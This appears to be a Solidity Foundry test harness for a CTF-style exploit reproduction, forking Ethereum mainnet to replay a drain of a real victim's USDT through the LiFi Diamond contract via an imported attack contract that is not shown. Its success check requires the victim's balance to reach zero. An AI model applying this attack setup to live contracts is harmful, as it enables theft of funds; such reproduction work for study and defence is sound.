// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test, console} from "forge-std/Test.sol";
import {LiFiDiamond} from "../../src/LiFiDiamond/LiFiDiamond.sol";
import {AttackLiFiDiamond} from "./AttackLiFiDiamond.sol";

contract LiFiDiamondChallenge is Test {
    uint256 constant blockNumber = 20318962;
    address constant player = 0x8B3Cb6Bf982798fba233Bca56749e22EEc42DcF3;
    address constant sufferer = 0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF;

    LiFiDiamond diamond =
        LiFiDiamond(payable(0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE));

    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    modifier checkSolvedByPlayer() {
        _assertInitialState();
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        uint256 forkId = vm.createFork(
            vm.envString("ETH_RPC_URL"),
            blockNumber
        );
        vm.selectFork(forkId);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function testAttack() public checkSolvedByPlayer {
        AttackLiFiDiamond attackContract = new AttackLiFiDiamond();
        attackContract.attack{value: 2}(
            address(diamond),
            address(USDT),
            sufferer,
            player
        );
    }

    function _assertInitialState() internal view {
        uint256 balance_usdt_before = USDT.balanceOf(sufferer);
        assertGt(balance_usdt_before, 0);
        console.log("before balance_usdt:", balance_usdt_before);
    }

    function _isSolved() private view {
        uint256 balance_usdt_after = USDT.balanceOf(sufferer);
        console.log("after balance_usdt:", balance_usdt_after);
        assertEq(balance_usdt_after, 0);
    }
}

// forge test --match-contract AttackLiFiDiamond -vvv
